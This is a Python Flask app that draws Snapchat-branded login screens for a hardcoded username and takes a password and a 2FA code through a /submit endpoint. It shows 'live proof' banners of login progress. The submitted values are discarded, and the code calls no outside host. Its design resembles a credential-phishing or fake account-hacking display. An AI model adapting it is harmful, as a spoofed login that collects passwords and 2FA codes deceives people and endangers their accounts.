import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

HARDCODED_USER = "zexoghaith"

# Clean global state
state = {
    'stage': 'login',   # login | password | 2fa | done
    'update_count': 0
}

def generate_screenshot():
    """Create realistic Snapchat login screenshots with clear stage banners"""
    from PIL import Image, ImageDraw, ImageFont
    
    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#000000')
    draw = ImageDraw.Draw(img)

    try:
        big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 28)
        med = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 15)
    except:
        big = med = ImageFont.load_default()

    stage = state['stage']
    now = datetime.now().strftime("%H:%M:%S")
    state['update_count'] += 1

    # Black background
    draw.rectangle([0, 0, w, h], fill='#000000')

    # Top bar
    draw.rectangle([0, 0, w, 42], fill='#111111')
    draw.text((w//2 - 70, 2), "Snapchat", fill='#FFFC00', font=big)

    # Login card
    cx, cy = 420, 55
    draw.rounded_rectangle([cx, cy, cx+440, cy+470], radius=12, fill='#1f1f1f')
    draw.text((cx+15, cy+10), "Log in to Snapchat", fill='white', font=med)

    # Username field
    draw.rounded_rectangle([cx+15, cy+48, cx+425, cy+85], radius=6, fill='#2c2c2c')
    draw.text((cx+26, cy+57), "zexoghaith", fill='white', font=med)

    # Password field
    draw.rounded_rectangle([cx+15, cy+95, cx+425, cy+132], radius=6, fill='#2c2c2c')
    if stage != 'login':
        draw.text((cx+26, cy+104), "••••••••••", fill='#22c55e', font=med)
    else:
        draw.text((cx+26, cy+104), "••••••••••", fill='#888888', font=med)

    # Log In button
    by = cy + 150
    if stage == 'password':
        draw.rounded_rectangle([cx+15, by, cx+425, by+40], radius=16, fill='#444444')
        draw.text((cx+100, by+8), "Logging in...", fill='#999999', font=med)
    else:
        draw.rounded_rectangle([cx+15, by, cx+425, by+40], radius=16, fill='#FFFC00')
        draw.text((cx+145, by+8), "Log In", fill='#000000', font=med)

    # Social buttons
    draw.rounded_rectangle([cx+15, by+52, cx+425, by+85], radius=14, fill='#2c2c2c')
    draw.text((cx+85, by+60), "Continue with Google", fill='white', font=med)

    draw.rounded_rectangle([cx+15, by+95, cx+425, by+128], radius=14, fill='#2c2c2c')
    draw.text((cx+90, by+103), "Continue with Apple", fill='white', font=med)

    # === VERY OBVIOUS STAGE BANNERS ===
    if stage == 'password':
        draw.rounded_rectangle([cx+10, cy+195, cx+430, cy+305], radius=8, fill='#3f2a00')
        draw.text((cx+20, cy+210), "PASSWORD ENTERED", fill='#f59e0b', font=big)
        draw.text((cx+20, cy+250), "Log In button was clicked", fill='white', font=med)
        draw.text((cx+20, cy+275), "Waiting for Snapchat...", fill='#888888', font=med)

    if stage == '2fa':
        draw.rounded_rectangle([cx+10, cy+195, cx+430, cy+340], radius=8, fill='#1e3a8a')
        draw.text((cx+25, cy+210), "2FA CODE NEEDED", fill='#60a5fa', font=big)
        draw.text((cx+25, cy+250), "Enter 6-digit code", fill='white', font=med)
        for i in range(6):
            draw.rectangle([cx+30 + i*38, cy+280, cx+30 + i*38 + 32, cy+312], outline='#3b82f6', width=2)

    if stage == 'done':
        draw.rounded_rectangle([cx+10, cy+195, cx+430, cy+340], radius=8, fill='#052e16')
        draw.text((cx+70, cy+235), "✓ LOGGED IN!", fill='#22c55e', font=big)

    # Live proof
    draw.rounded_rectangle([10, 555, 280, 600], radius=5, fill='#ef4444')
    draw.text((15, 562), f"UPDATE #{state['update_count']}", fill='white', font=big)

    draw.rounded_rectangle([10, 610, 420, 660], radius=5, fill='#22c55e')
    draw.text((15, 617), f"TIME: {now}", fill='black', font=big)

    draw.text((440, 620), f"STAGE:{stage}", fill='#ff8800', font=med)

    draw.rectangle([0, h-35, w, h], fill='#111111')
    draw.text((8, h-28), "LIVE • changes only after you submit", fill='#22c55e', font=med)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    return path

def run_loop():
    global state
    print("[LOOP] Starting clean Snapchat simulation")
    
    # Force clean login state
    state['stage'] = 'login'
    state['update_count'] = 0
    
    generate_screenshot()
    state['started'] = True
    
    while True:
        generate_screenshot()
        time.sleep(0.8)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    pw = (data.get('password') or '').strip()
    cd = (data.get('code') or '').strip()
    
    if pw:
        state['stage'] = 'password'
        print("[SUBMIT] Password submitted -> PASSWORD ENTERED banner")
        generate_screenshot()
        return jsonify({'ok': True, 'stage': 'password'})
    
    if cd and len(cd) >= 4:
        state['stage'] = '2fa'
        print("[SUBMIT] 2FA submitted -> 2FA screen")
        generate_screenshot()
        return jsonify({'ok': True, 'stage': '2fa'})
    
    return jsonify({'ok': True})

@app.route('/screenshot')
def shot():
    generate_screenshot()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def stat():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        'stage': state['stage'],
        'update_count': state['update_count'],
        'size': size
    })

@app.before_request
def boot():
    if not hasattr(app, 'booted'):
        app.booted = True
        threading.Thread(target=run_loop, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))